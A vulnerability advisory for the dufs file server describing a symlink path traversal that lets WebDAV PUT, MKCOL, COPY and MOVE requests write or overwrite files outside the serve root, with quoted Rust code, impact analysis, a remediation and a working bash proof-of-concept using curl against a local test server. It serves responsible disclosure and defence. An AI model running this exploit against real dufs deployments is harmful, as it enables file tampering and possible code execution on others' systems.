---
lang: en
title: "Symlink Path Traversal Allows Arbitrary File Write Outside Serve Root"
project: dufs
cwe:
  - CWE-22
  - CWE-59
  - CWE-61
  - CWE-73
severity: high
cvss: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H"
score: "7.4"
verified: "v0.45.0"
affected:
patched:
date: 2025-02-01
---

### Summary

A vulnerability exists where an attacker can write arbitrary files or directories outside the configured **serve root**, regardless of authentication status (depending on settings), even when `allow_symlink` is disabled (the default). If a symbolic link pointing to an external directory exists within the **serve root**, it is possible to create or overwrite files outside the intended directory boundaries using PUT, MKCOL, COPY, and MOVE operations.

> This vulnerability only affects dufs installations explicitly configured with `--allow-upload`. The default read-only configuration is not affected.

### Details

- **Verified version**: dufs v0.45.0

When `allow_symlink` is `false` (default), dufs is intended to prevent access outside the **serve root** via symbolic links. However, the `is_root_contained` check is **only executed for existing paths**.

**server.rs (approx. lines 275-278)**:

```rust
// Due to the !is_miss condition, non-existent paths are processed further without verification.
// 1. Do not allow external references via symbolic links.
// 2. A file or link actually exists at the specified path.
// 3. The actual (normalized) path of that entity is outside the serve root directory.
if !self.args.allow_symlink && !is_miss && !self.is_root_contained(path).await {
    status_not_found(&mut res);
    return Ok(res);
}
```

Because of the `!is_miss` condition, **the check is skipped for non-existent paths**. Consequently, for write operations targeting new files or directories, there is no validation to ensure the resolved path remains within the **serve root**.

Furthermore, `handle_upload`, `handle_copy`, and `handle_move` call `ensure_path_parent()`, but this function only confirms the existence of the parent directory and does not verify if the final resolved path is within the **serve root**.

**server.rs (approx. lines 1633-1640)**:

```rust
async fn ensure_path_parent(path: &Path) -> Result<()> {
    if let Some(parent) = path.parent() {
        if fs::symlink_metadata(parent).await.is_err() {
            fs::create_dir_all(&parent).await?;
        }
    }
    Ok(())
}
```

The `handle_copy` and `handle_move` functions invoke `extract_dest()`. However, while authorization is enforced, the resulting `dest_path` is not verified via the `is_root_contained` validation.

**server.rs (approx. lines 1299-1355)**

```rust
fn extract_dest(&self, req: &Request, res: &mut Response) -> Option<PathBuf> {
    let headers = req.headers();
    let dest_path = match self
        .extract_destination_header(headers)
        .and_then(|dest| self.resolve_path(&dest))
    {
        Some(dest) => dest,
        None => {
            status_bad_request(res, "Invalid Destination");
            return None;
        }
    };

    let authorization = headers.get(AUTHORIZATION);
    let guard = self
        .args
        .auth
        .guard(&dest_path, req.method(), authorization, None, false);

    match guard {
        (_, Some(_)) => {}
        _ => {
            status_forbid(res);
            return None;
        }
    };

// ... but NO is_root_contained check here!
}
```

- **Executable Operations**:
  - Creation of new files/directories outside the **serve root**.
  - Copying/Moving files from inside the **serve root** to outside.
  - Overwriting arbitrary files outside the **serve root**.

- **Exploitation Conditions**:
  - `allow_symlink` is disabled in server settings (disabled by default).
  - WebDAV is enabled, and PUT/MKCOL/COPY/MOVE operations are permitted.
  - An attacker can place a symbolic link pointing to a directory outside the **serve root** in a writable location.
  - The operation is performed while the target path **does not exist** (`is_miss = true`).

### PoC

- **Testing Environment**:
  - dufs v0.45.0 (Verified)
  - Linux (Any distribution)

**Expected Behavior**:
When `allow_symlink=false`, requests to a destination pointing outside the serve root via a symbolic link should be rejected with 404 or 403. **Actual Behavior:** A file is created at `$EXTERNAL_DIR/pwned.txt`, which is outside the **serve root**.

**poc_dufs.sh**

```sh
#!/bin/bash
set -e

# PoC: Symlink Path Traversal Write in dufs (Directory Symlink Variant)
# Tested: dufs v0.45.0
# Affected: Unknown (requires vendor confirmation)
# Vulnerability: Arbitrary File Write via Symlink when allow_symlink=false
# Execution condition: The project root must be the current directory.

# Serve Root
ROOT_DIR="/tmp/dufs-poc-$$/root"
# Target outside root
EXTERNAL_DIR="/tmp/dufs-poc-$$/external"
LINK_NAME="evil_link"
PORT=15555
TARGET_CONTENT="VULNERABLE: File written outside dufs root directory"

# Cleanup function to remove temp files and kill server
cleanup() {
    echo "[*] Cleaning up..."
    # To check files leaked from the serve root, change this to a comment.
    # rm -rf "$ROOT_DIR" "$EXTERNAL_DIR"
    pkill -f "dufs.*$PORT" 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

# Step 1: Setup environment
echo "[*] Step 1: Setup environment"
rm -rf "$ROOT_DIR" "$EXTERNAL_DIR"
mkdir -p "$ROOT_DIR" "$EXTERNAL_DIR"
# end Step 1

# Step 2: Create symlink inside root pointing outside
echo "[*] Step 2: Create symlink inside root pointing outside"
ln -s "$EXTERNAL_DIR" "$ROOT_DIR/$LINK_NAME"
echo "    Symlink created: $ROOT_DIR/$LINK_NAME -> $EXTERNAL_DIR"
# end Step 2

# Step 3: Start dufs server with allow_symlink=false and allow_upload=true, allow_delete=true
echo "[*] Step 3: Start dufs server (allow_symlink=false, allow_upload=true, allow_delete=true)"
# Get the dufs binary path (prefer release)
DUFS_BIN=$(find ./target -maxdepth 3 -type f -executable -name dufs \
    \( -path "*/release/*" -o -path "*/debug/*" \) 2>/dev/null | sort -r | head -1)

if [ -z "$DUFS_BIN" ]; then
    echo "Error: dufs binary not found. Run 'cargo build' first." >&2
    exit 1
fi
echo "Using binary: $DUFS_BIN"

# launch background dufs and log output
# --allow-symlink defaults to false
$DUFS_BIN "$ROOT_DIR" --allow-upload --allow-delete --port $PORT --log-file /tmp/dufs-poc-$$.log > /dev/null 2>&1 &
DUFS_PID=$!
echo "    dufs started with PID $DUFS_PID on port $PORT"

sleep 2

# Verify server is running
if ! kill -0 $DUFS_PID 2>/dev/null; then
    echo "[!] ERROR: dufs failed to start"
    exit 1
fi

# Step 4: Exploit - Write file via symlink to outside root
echo "[*] Step 4: Exploit - Write file via symlink to outside root"
echo ""

# Test 4.1: PUT method
echo "  [4.1] Testing PUT method..."
PUT_FILE="webdav_put_$$.txt"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X PUT \
    "http://127.0.0.1:$PORT/$LINK_NAME/$PUT_FILE" \
    -H "Content-Type: text/plain" \
    -d "$TARGET_CONTENT")
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.2: MKCOL method (WebDAV - create directory)
echo "  [4.2] Testing MKCOL method (WebDAV)..."
MKCOL_DIR="webdav_mkcol_dir_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X MKCOL \
    "http://127.0.0.1:$PORT/$LINK_NAME/$MKCOL_DIR")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$MKCOL_DIR"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.3: COPY method (WebDAV - copy file to symlink destination)
echo "  [4.3] Testing COPY method (WebDAV)..."
# First create a source file inside root
SOURCE_FILE="source_for_copy.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$SOURCE_FILE" \
    -H "Content-Type: text/plain" \
    -d "Source file for copy test" > /dev/null
COPY_DEST="webdav_copy_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X COPY \
    "http://127.0.0.1:$PORT/$SOURCE_FILE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$COPY_DEST")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$COPY_DEST"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.4: MOVE method (WebDAV - move file to symlink destination)
# --allow-delete option is required
echo "  [4.4] Testing MOVE method (WebDAV)..."
MOVE_SOURCE="source_for_move_$$.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$MOVE_SOURCE" \
    -H "Content-Type: text/plain" \
    -d "Source file for move test" > /dev/null
MOVE_DEST="webdav_move_$$"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X MOVE \
    "http://127.0.0.1:$PORT/$MOVE_SOURCE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$MOVE_DEST")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$MOVE_DEST"
echo "    HTTP Status: $HTTP_STATUS"

# Test 4.5: COPY method to overwrite existing file (CRITICAL)
# This is the most dangerous - works without --allow-delete
echo "  [4.5] Testing COPY method - Overwrite existing file (CRITICAL)..."
EXISTING_FILE="existing_file_$$"
echo "ORIGINAL CONTENT - This should be overwritten" > "$EXTERNAL_DIR/$EXISTING_FILE"
echo "    Created existing file: $EXTERNAL_DIR/$EXISTING_FILE"
SOURCE_OVERWRITE="source_for_overwrite.txt"
curl -s -X PUT "http://127.0.0.1:$PORT/$SOURCE_OVERWRITE" \
    -H "Content-Type: text/plain" \
    -d "OVERWRITTEN CONTENT - Attack successful" > /dev/null
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X COPY \
    "http://127.0.0.1:$PORT/$SOURCE_OVERWRITE" \
    -H "Destination: http://127.0.0.1:$PORT/$LINK_NAME/$EXISTING_FILE")
echo "    Target: http://127.0.0.1:$PORT/$LINK_NAME/$EXISTING_FILE"
echo "    HTTP Status: $HTTP_STATUS"

# end Step 4

sleep 1

# Step 5: Verify if files were created outside root
echo "[*] Step 5: Verify vulnerability"
if [ -f "$EXTERNAL_DIR/$PUT_FILE" ]; then
    echo ""
    echo "[VULNERABLE - PATH TRAVERSAL]"
    echo "Files created OUTSIDE serve root:"

    # Check WebDAV artifacts
    echo "  [PUT]   File created: $EXTERNAL_DIR/$PUT_FILE"
    if [ -d "$EXTERNAL_DIR/$MKCOL_DIR" ]; then
        echo "  [MKCOL] Directory created: $EXTERNAL_DIR/$MKCOL_DIR"
    fi
    if [ -f "$EXTERNAL_DIR/$COPY_DEST" ]; then
        echo "  [COPY]  File created: $EXTERNAL_DIR/$COPY_DEST"
    fi
    if [ -f "$EXTERNAL_DIR/$MOVE_DEST" ]; then
        echo "  [MOVE]  File created: $EXTERNAL_DIR/$MOVE_DEST"
    fi
    if [ -f "$EXTERNAL_DIR/$EXISTING_FILE" ]; then
        OVERWRITE_CONTENT=$(cat "$EXTERNAL_DIR/$EXISTING_FILE")
        if [[ "$OVERWRITE_CONTENT" == *"OVERWRITTEN"* ]]; then
            echo "  [COPY-OVERWRITE] Existing file overwritten!"
            echo "                   $EXTERNAL_DIR/$EXISTING_FILE"
            echo "                   Content: $OVERWRITE_CONTENT"
        fi
    fi

    echo ""
    ls -lah "$EXTERNAL_DIR"
    exit 0
else
    echo ""
    echo "[NOT VULNERABLE - PATCHED]"
    echo "File was NOT created outside root (patch is effective)"
    exit 1
fi
# end Step 5
```

### Impact

- **Potential Consequences**:
  - Arbitrary file creation or overwriting outside the intended **serve root** directory.
  - Tampering with system configurations.
  - Code execution by writing to web-accessible directories or cron job directories.
  - Denial of Service (DoS) by overwriting critical system files.

- **Affected Users**:
  - Users running dufs with `--allow-upload` or WebDAV write access enabled. (If `--allow-delete` is enabled, the vulnerability also manifests via MOVE operations.)
  - Users who have symbolic links within the **serve root** pointing to external directories (common in shared hosting, Docker volume mounts, or misconfigured environments).
  - Systems where dufs is running with elevated privileges or has access to sensitive directories.

**Impact Scope by Protocol Method**:

| **Operation**                                                               | **Function**    | **Vulnerable?** | **Required Option**             |
| --------------------------------------------------------------------------- | --------------- | --------------- | ------------------------------- |
| PUT                                                                         | `handle_upload` | Yes             | --allow-upload                  |
| MKCOL                                                                       | `handle_mkcol`  | Yes             | --allow-upload                  |
| COPY                                                                        | `handle_copy`   | Yes             | --allow-upload                  |
| MOVE                                                                        | `handle_move`   | Yes             | --allow-upload & --allow-delete |
| Others (\*Operations that assume is_miss=false are generally not affected.) | `handle_...`    | No\*            | None                            |

**Recommended Remediation**:
Apply the `is_root_contained` check to the **destination path** in `PUT, MKCOL, COPY, and MOVE` operations, regardless of whether the target already exists.
